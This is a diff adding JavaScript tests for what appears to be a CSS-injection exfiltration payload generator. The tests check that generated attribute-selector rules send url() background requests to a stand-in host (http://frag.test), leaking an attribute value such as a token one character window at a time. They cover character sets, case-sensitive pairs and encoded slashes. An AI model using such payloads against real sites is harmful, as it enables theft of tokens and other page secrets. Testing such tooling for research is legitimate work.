@@ -86,3 +86,60 @@ test('sparse backgrounds include exactly the matched probes, or just none', () =
     }
   }
 });
+
+test('charsets: alphabets, helpers and window sizes', () => {
+  assert.deepEqual(Object.keys(P.CHARSETS), ['hex', 'alnum', 'base64', 'base64url']);
+  assert.equal(P.CHARSETS.alnum.fold.length, 36);
+  assert.equal(P.CHARSETS.base64.fold.length, 39);
+  assert.equal(P.CHARSETS.base64url.fold.length, 38);
+  assert.equal(P.charsetOf('nope'), P.CHARSETS.hex);
+  assert.equal(P.charsetOf('__proto__'), P.CHARSETS.hex);
+  assert.equal(P.charsetName(undefined), 'hex');
+  assert.equal(P.windowSizeFor('hex', 3), 3);
+  assert.equal(P.windowSizeFor('hex', 'x'), 4);
+  assert.equal(P.windowSizeFor('alnum', 4), 3, 'non-hex charsets only offer 3-char windows');
+  // Case pairs: every pair over the full alphabet with at least one letter.
+  assert.equal(P.caseBigrams(P.CHARSETS.hex).length, 0);
+  assert.equal(P.caseBigrams(P.CHARSETS.alnum).length, 62 ** 2 - 10 ** 2);
+  assert.equal(P.caseBigrams(P.CHARSETS.base64).length, 65 ** 2 - 13 ** 2);
+  for (const cs of Object.values(P.CHARSETS)) assert.equal(P.caseBigramCount(cs), P.caseBigrams(cs).length);
+  assert.deepEqual([...P.foldWindows('Token=AB/', P.CHARSETS.base64, 3)],
+    ['tok', 'oke', 'ken', 'en=', 'n=a', '=ab', 'ab/']);
+  assert.deepEqual([...P.foldWindows('callback?x', P.CHARSETS.hex, 3)], ['bac']);
+  assert.deepEqual([...P.caseBigramsIn('To+k3', P.CHARSETS.alnum)], ['To', 'k3']);
+  assert.equal(P.pathChunk('a/b/'), 'a%2Fb%2F');
+  assert.equal(P.attributeTest('href', '*=', 'abc', true), '[href*=abc i]');
+  assert.equal(P.attributeTest('href', '*=', '0ab', true), '[href*="0ab"i]');
+  assert.equal(P.attributeTest('href', '*=', 'aB', false), '[href*=aB]');
+  assert.equal(P.attributeTest('href', '*=', '123', true), '[href*="123"]');
+  assert.equal(P.attributeTest('href', '*=', '+/=', true), '[href*="+/="]');
+  assert.equal(P.attributeTest('href', '*=', '-_9', true), '[href*=-_9]');
+});
+
+test('non-hex payloads: case-insensitive windows, case-sensitive pairs, encoded slashes', () => {
+  const cfg = { selector: 'a', attribute: 'href', tag: 'a', windowSize: 3, charset: 'base64',
+    useStartsWith: true, useEndsWith: true };
+  const css = P.generateCSS(cfg, 'http://frag.test');
+  const rules = parsePayload(css);
+  assert.equal(rules.length, P.ruleCount(cfg));
+  assert.equal(rules.length, 39 ** 3 + 2 * 39 ** 2 + 65 ** 2 - 13 ** 2);
+  for (const r of rules) assert.equal(r.ci, r.t !== 'c' && /[a-z]/i.test(r.value), `${r.t}/${r.c}`);
+  assert.ok(css.includes('&[href*=a\\/b i]{--'), 'slash windows are matched');
+  assert.ok(css.includes('url(http://frag.test/a%2Fb),'), 'and sent as %2F');
+  assert.ok(css.includes('&[href*=aB]{--'));
+  assert.ok(css.includes('url(http://frag.test/c/aB),'));
+  // Hex payloads are unchanged: no flags, no case pairs.
+  const hex = P.generateCSS({ ...cfg, charset: 'hex' }, 'http://frag.test');
+  assert.ok(!/ i\]|"i\]|\/c\//.test(hex));
+  assert.equal(parsePayload(hex).length, 16 ** 3 + 2 * 16 ** 2);
+});
+
+test('non-hex sparse backgrounds include exactly the matched probes', () => {
+  const cfg = { selector: 'a', attribute: 'href', tag: 'a', windowSize: 3, charset: 'alnum',
+    useStartsWith: true, useEndsWith: true };
+  const css = P.generateCSS(cfg, 'http://frag.test');
+  const value = 'Ab3dE';
+  const { requests } = leak(parsePayload(css), value);
+  const got = new Set(requests.map(r => (r.t === 'm' ? '' : r.t + '/') + r.c));
+  assert.deepEqual(got, new Set(['s/ab', 'ab3', 'b3d', '3de', 'c/Ab', 'c/b3', 'c/3d', 'c/dE', 'e/de']));
+});
